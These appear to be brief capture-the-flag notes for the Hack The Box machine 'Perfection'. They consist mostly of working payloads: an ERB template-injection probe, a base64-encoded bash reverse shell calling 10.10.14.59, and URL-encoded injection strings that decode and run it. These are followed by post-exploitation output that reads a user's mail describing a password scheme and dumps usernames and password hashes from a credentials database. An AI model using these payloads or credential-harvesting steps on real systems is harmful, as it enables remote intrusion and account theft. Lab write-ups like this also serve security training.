# HTB-Perfection

7 * 7

%0A<%25%3d+7*7+%25>

``` shell
base64 <<< "bash -i >& /dev/tcp/10.10.14.59/11234 0>&1" | sed 's/\+/\%2b/'
```


``` urlencode

test <%=system("echo+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41OS8xMTIzNCAwPiYxCg==+|+base64+-d+|+bash");%>

test%0A<%25%3dsystem("echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC41OS8xMTIzNCAwPiYxCg==+|+base64+-d+|+bash");%25>
```

``` 
susan@perfection:/$ cat /var/mail/susan
susan@perfection:/$ cat /var/mail/susan

Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student

susan@perfection:/$
susan@perfection:~$ grep -i password -R .
grep -i password -R .
grep: ./Migration/pupilpath_credentials.db: binary file matches

susan@perfection:~$ strings ./Migration/pupilpath_credentials.db
strings ./Migration/pupilpath_credentials.db
SQLite format 3
tableusersusers
CREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
Stephen Locke154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
*Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q*
Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
susan@perfection:~$ 

